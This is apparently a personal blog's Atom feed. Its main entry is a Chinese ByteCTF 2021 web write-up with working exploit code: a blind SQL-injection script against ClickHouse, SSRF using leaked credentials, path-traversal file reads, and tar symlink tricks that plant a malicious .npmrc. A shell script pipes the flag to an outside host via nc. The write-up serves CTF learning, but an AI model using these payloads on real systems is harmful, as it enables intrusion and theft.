<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liki4</title>
  
  
  <link href="https://me.liki.link/atom.xml" rel="self"/>
  
  <link href="https://me.liki.link/"/>
  <updated>2021-10-18T03:09:16.695Z</updated>
  <id>https://me.liki.link/</id>
  
  <author>
    <name>Liki4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DN42</title>
    <link href="https://me.liki.link/20770302/DN42/"/>
    <id>https://me.liki.link/20770302/DN42/</id>
    <published>2077-03-02T04:00:00.000Z</published>
    <updated>2021-10-18T03:09:16.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DN42"><a href="#DN42" class="headerlink" title="DN42"></a>DN42</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>Liki4</p><p>只是 DN42 的一个小玩家，</p><p>用来 peer 的小鸡是一台 BuyVM 的 VPS，</p><p>以后应该也会一直续费下去，</p><p>因为系统暂时是 RouterOS v6，</p><p>所以没有 WireGuard，</p><p>但是可以支持各种各样的隧道，</p><p>为了方便就直接用 GRE/Plain 来 peer 了，</p><p>等到 RouterOS v7 发布正式版就更新，</p><p>就可以用 WireGuard 来 peer 了。</p><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><pre class="line-numbers language-none"><code class="language-none">My Informations:ASN:        4242420927LV1 - Las Vegas, US, BuyVMTunnel:     GRE&#x2F;PlainIPv4:       199.19.226.83MTU:        1476DN42IPv4:     172.21.77.33IPv6:     fd80:96c2:e41e:3dcc::1Link-Local Support: NoMultiprotocol BGP Support: Yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DN42&quot;&gt;&lt;a href=&quot;#DN42&quot; class=&quot;headerlink&quot; title=&quot;DN42&quot;&gt;&lt;/a&gt;DN42&lt;/h1&gt;&lt;h2 id=&quot;About&quot;&gt;&lt;a href=&quot;#About&quot; class=&quot;headerlink&quot; title=&quot;About&quot;&gt;</summary>
      
    
    
    
    
    <category term="dn42" scheme="https://me.liki.link/tags/dn42/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF 2021 Web WP</title>
    <link href="https://me.liki.link/20211018/ByteCTF-2021-Web-WP/"/>
    <id>https://me.liki.link/20211018/ByteCTF-2021-Web-WP/</id>
    <published>2021-10-18T03:28:13.000Z</published>
    <updated>2021-10-18T03:53:59.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF-2021-Web-WriteUp"><a href="#ByteCTF-2021-Web-WriteUp" class="headerlink" title="ByteCTF 2021 Web WriteUp"></a>ByteCTF 2021 Web WriteUp</h1><h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><p>不愧是字节</p><p>比赛题目的质量还是很高的</p><p>相比平时打的很多其他比赛更能让人有去解题的欲望</p><p>虽然很难但是打得很开心</p><p>最后只做出来 <code>double sqli</code> 和 <code>easy_extract</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="double-sqli"><a href="#double-sqli" class="headerlink" title="double sqli"></a>double sqli</h3><p>通过报错知道是个叫 ClickHouse 的 DBMS</p><p>语句是</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> ByteCTF <span class="token keyword">from</span> hello <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有任何过滤，通过布尔盲注可以得到数据库内的数据</p><hr><p>database: <code>default</code><br>table: <code>hello</code><br>| ByteCTF            |<br>| —————— |<br>| Welcome to ByteCTF |</p><hr><p>database: <code>ctf</code><br>table: <code>hint</code><br>| id                                     |<br>| ————————————– |<br>| you_dont_have_permissions_to_read_flag |</p><hr><p>ClickHouse version：21.3.2.5<br>database user： user_02</p><hr><p>一开始以为是 CVE-2021-25263<br>但没有读文件的权限</p><p>从 <code>user_02</code> 的用户名猜测应该有一个 <code>user_01</code> 用户<br><code>user_01</code> 用户应该有 <code>user_02</code> 用户所没有的权限，可以看到一些对 <code>user_02</code> 用户隐藏的表</p><p>ClickHouse 是通过 HTTP 协议来连接/管理数据库的<br>可以通过 <code>URL</code> 函数 ssrf 执行 ClickHouse HTTP 客户端的查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> field <span class="token keyword">FROM</span> url<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8123/?username=user_02=password=123456&amp;query=SELECT 1'</span><span class="token punctuation">,</span><span class="token string">'LineAsString'</span><span class="token punctuation">,</span><span class="token string">'field String'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是没有账号密码<br><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png" class="lozad post-image"src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png"></p><p>在 Web 应用的 <code>/files/</code> 目录有文件浏览，尝试进行目录穿越<br>发现了任意文件读</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;users.listhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;a2492bae-77c4-e443-4fce-c04e47cd43a1.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>a2492bae-77c4-e443-4fce-c04e47cd43a1.sql</code> 文件内容如下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ATTACH <span class="token keyword">USER</span> user_01 IDENTIFIED <span class="token keyword">WITH</span> plaintext_password <span class="token keyword">BY</span> <span class="token string">'e3b0c44298fc1c149afb'</span><span class="token punctuation">;</span> ATTACH <span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> ctf<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> user_01<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 <code>user_01</code> 的明文密码<br><code>user_01:e3b0c44298fc1c149afb</code></p><p>有 <code>ctf</code> 库的全部权限<br>构造请求</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name <span class="token keyword">from</span> system<span class="token punctuation">.</span><span class="token keyword">tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到 <code>ctf</code> 库中存在两张表，<code>hint</code> 和 <code>flag</code> 表，然后继续得到 <code>flag</code> 表列名 <code>flag</code><br>最后得到 flag</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctf<span class="token punctuation">.</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl_tpl <span class="token operator">=</span> <span class="token string">"http://39.105.116.246:30001/?id=1 and if(&#123;query&#125;,1,0)"</span>query_tpl_count <span class="token operator">=</span> <span class="token string">"count(&#123;target&#125;)"</span>query_tpl_length <span class="token operator">=</span> <span class="token string">"char_length(toString(&#123;target&#125;))"</span>query_tpl_data <span class="token operator">=</span> <span class="token string">"(select mid(toString(&#123;target&#125;),&#123;offset&#125;,1) from &#123;table&#125; limit 1 offset &#123;toffset&#125;)='&#123;arg&#125;'"</span><span class="token comment"># target = "DATABASE()"</span><span class="token comment"># target_table = "system.databases"</span><span class="token comment"># target = "cluster"</span><span class="token comment"># target_table = "system.clusters"</span><span class="token comment"># target = "name"</span><span class="token comment"># target_table = "system.dictionaries"</span><span class="token comment"># target = "field"</span><span class="token comment"># target_table = "url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)"</span>target <span class="token operator">=</span> <span class="token string">"field"</span>target_table <span class="token operator">=</span> <span class="token string">"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)"</span>ascii_space <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token keyword">def</span> <span class="token function">getCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    offset <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">True</span>        query_target <span class="token operator">=</span> query_tpl_count<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">)</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>query_target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>            url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>            <span class="token comment"># print(url)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token comment"># print(query)</span>                result <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token keyword">break</span>        offset <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getDataLen</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">:</span>    toffset <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token string">""</span>        offset <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            query_target <span class="token operator">=</span> query_tpl_length<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">)</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>                query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>query_target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span>toffset<span class="token punctuation">)</span>                url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>                <span class="token comment"># print(query)</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    result <span class="token operator">+=</span> c                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            offset <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                getData<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>toffset<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        toffset <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>toffset<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    offset <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> ascii_space<span class="token punctuation">:</span>            query <span class="token operator">=</span> query_tpl_data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">,</span> offset<span class="token operator">=</span>offset<span class="token punctuation">,</span> arg<span class="token operator">=</span>c<span class="token punctuation">,</span> table<span class="token operator">=</span>target_table<span class="token punctuation">,</span> toffset<span class="token operator">=</span>toffset<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>            url <span class="token operator">=</span> url_tpl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>query<span class="token operator">=</span>query<span class="token punctuation">)</span>            <span class="token comment"># print(query)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Welcome to ByteCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                result <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token keyword">break</span>        offset <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            <span class="token keyword">break</span>cnt <span class="token operator">=</span> getCnt<span class="token punctuation">(</span><span class="token punctuation">)</span>getDataLen<span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token comment"># getData()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-extract"><a href="#easy-extract" class="headerlink" title="easy_extract"></a>easy_extract</h3><p>查看 http 返回头，发现是个 nodejs 写的应用，用户上传 tar 压缩文件，后端解压后将压缩包里的文件名返回给前端。</p><p>访问 <code>/robots.txt</code>，发现有个 Dockerfile，内容为：</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM node:current-alpineENV NODE_ENV&#x3D;productionWORKDIR &#x2F;appARG CHALL_FLAGENV CHALL_FLAG $CHALL_FLAGRUN apk update &amp;&amp; apk add bash musl-dev gccCOPY [&quot;package.json&quot;, &quot;.&#x2F;&quot;]RUN npm install -g nodemon --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org &amp;&amp; \    npm install --production --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.orgCOPY . .RUN echo $CHALL_FLAG &gt; &#x2F;flag &amp;&amp; chmod 0600 &#x2F;flag &amp;&amp; gcc readflag.c -o &#x2F;readflag  &amp;&amp; chmod u+s &#x2F;readflag &amp;&amp; \    mkdir &#x2F;app&#x2F;data &amp;&amp; chmod -R 755 &#x2F;app &amp;&amp; chown -R node &#x2F;app&#x2F;dataUSER nodeCMD [&quot;nodemon&quot;, &quot;--exec&quot;, &quot;npm start&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2021 8月 nodejs tar 的两个 cve<br><a href="https://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update">https://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update</a></p><p>解压出来的文件默认是保存在 <code>/app/data</code> 里的，通过软链接与特殊名字的文件夹实现任意文件写</p><p>tar 里允许打包软链接，这里打包一个指向根目录的软链接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F; .&#x2F;111tar -zcvf asd.tar .&#x2F;111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传 <code>asd.tar</code>， 页面返回结果</p><pre class="line-numbers language-none"><code class="language-none">done. files:111111&#x2F;app111&#x2F;bin111&#x2F;dev111&#x2F;etc111&#x2F;flag...111&#x2F;readflag...111&#x2F;home&#x2F;node...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此可以覆盖 <code>/app/data</code> 外的东西，覆盖任意文件,这里写入了 <code>/tmp/1</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tarfile<span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">from</span> tarfile <span class="token keyword">import</span> TarInfo<span class="token punctuation">,</span> SYMTYPE<span class="token punctuation">,</span>REGTYPE<span class="token punctuation">,</span>LNKTYPE<span class="token punctuation">,</span>DIRTYPEtarinfo1 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo1<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo/1"</span>tarinfo3 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo3<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo3<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo\\1"</span>tarinfo3<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/tmp"</span>tarinfo2 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo2<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> LNKTYPEtarinfo2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"foo\\1/1"</span>tarinfo2<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/app/data/123"</span>tar4 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tar4<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">=</span> REGTYPEtar4<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'123'</span><span class="token keyword">def</span> <span class="token function">make_tarfile</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token string">"w:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tar4<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo1<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo3<span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo2<span class="token punctuation">)</span>make_tarfile<span class="token punctuation">(</span><span class="token string">"a.tar"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从 Dockerfile 里得知，应用以 node 用户身份运行，只能修改 <code>/app/data</code> 和 <code>/home/node</code> 文件夹下的东西。</p><p>nodemon 默认配置检测了 <code>.*/**/*.js</code> 和 <code>./**/*.json</code>，当发生修改或有新文件创建的时候会重启，再次运行npm start 的时候，会加载当前用户下目录下的 <code>.npmrc</code>，可以向 <code>.npmrc</code> 注入一些选项。查阅 npm 的文档，script-shell 指定了执行 npm scripts 的 shell，默认 Windows上为 <code>cmd.exe</code>，posix 上为 <code>bash</code>，通过修改 script-shell 选项来在 nodemon 重启的时候执行我们想要的脚本。</p><p>传一个 <code>xxx.sh</code> 上去</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>/readflag <span class="token operator">|</span> <span class="token function">nc</span> vps_ip vps_port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>vps 上 起一个 nc 监听 tcp 连接<br><code>.npmrc</code> 内容</p><pre class="line-numbers language-none"><code class="language-none">script-shell &#x3D; &#x2F;app&#x2F;data&#x2F;xxx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成 tar 文件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tarfile<span class="token keyword">import</span> os<span class="token punctuation">.</span>path<span class="token keyword">from</span> tarfile <span class="token keyword">import</span> TarInfo<span class="token punctuation">,</span> SYMTYPE<span class="token punctuation">,</span>REGTYPE<span class="token punctuation">,</span>LNKTYPE<span class="token punctuation">,</span>DIRTYPE<span class="token punctuation">,</span>AREGTYPEtarinfo1 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo1<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao/1"</span>tarinfo11 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo11<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> DIRTYPEtarinfo11<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao/2"</span>tarinfo3 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo3<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo3<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\1"</span>tarinfo3<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/home/node"</span>tarinfo31 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo31<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo31<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\2"</span>tarinfo31<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/"</span>tarinfo2 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo2<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> LNKTYPEtarinfo2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\1/.npmrc"</span>tarinfo2<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/app/data/app.js"</span><span class="token keyword">def</span> <span class="token function">make_tarfile</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token string">"w:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        tar<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'npmrc'</span><span class="token punctuation">,</span> recursive<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>arcname<span class="token operator">=</span><span class="token string">"app.js"</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">"xxx.sh"</span><span class="token punctuation">,</span>recursive<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>arcname<span class="token operator">=</span><span class="token string">"xxx.sh"</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo1<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo11<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo3<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo31<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo2<span class="token punctuation">)</span>make_tarfile<span class="token punctuation">(</span><span class="token string">"b.tar"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传 <code>b.tar</code>，vps 上可看到 flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF-2021-Web-WriteUp&quot;&gt;&lt;a href=&quot;#ByteCTF-2021-Web-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF 2021 Web WriteUp&quot;&gt;&lt;/a&gt;ByteCTF 2021 W</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Web 安全基础知识思维导图</title>
    <link href="https://me.liki.link/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>https://me.liki.link/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2021-08-12T04:14:17.000Z</published>
    <updated>2021-10-18T04:20:36.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>转载自 Annevi</p><p>在我查漏补缺的时候帮到我很多</p><div class="row">    <embed src="web.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
      
      
